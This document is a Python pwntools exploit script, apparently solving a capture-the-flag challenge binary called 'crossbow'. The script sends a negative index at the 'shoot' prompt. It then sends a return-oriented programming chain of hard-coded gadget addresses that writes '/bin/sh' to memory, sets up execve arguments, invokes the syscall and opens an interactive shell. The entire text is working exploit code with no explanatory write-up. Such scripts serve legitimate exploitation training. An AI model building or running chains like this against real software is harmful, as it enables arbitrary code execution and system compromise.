#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

io = process('./dist/crossbow')

padding = b"A"*8
pop_rax_addr = p64(0x00404bc7)
bin_sh = b"/bin/sh\x00"
pop_rdi_addr = p64(0x0040ac2d)
# any position that writable is OK
writable_addr = p64(0x0040d000)
mov_rax_to_rdi_ptr_addr = p64(0x004020f5)
pop_rsi_addr = p64(0x004069b6)
pop_rdx_addr = p64(0x00401139)
execve_syscall_num = p64(59)
syscall_gadget_addr = p64(0x00405346)

payload = b"".join([
    # Padding will be set into RBP when leaving training. Actual value unimportant.
    padding,

    # execve pathname argument: gadget chain to ensure rdi points to "/bin/sh"
    pop_rax_addr,
    bin_sh,
    pop_rdi_addr,
    writable_addr,
    mov_rax_to_rdi_ptr_addr,

    # execve argv argument: null pointer
    pop_rsi_addr,
    p64(0),

    # execve envp argument: null pointer
    pop_rdx_addr,
    p64(0),

    # Ensure rax is set to the execve syscall number.
    pop_rax_addr,
    execve_syscall_num,

    # Invoke the execve system call
    syscall_gadget_addr
])

_ = io.sendlineafter(b'shoot: ', b'-2')
_ = io.sendlineafter(b'> ', payload)

io.interactive()
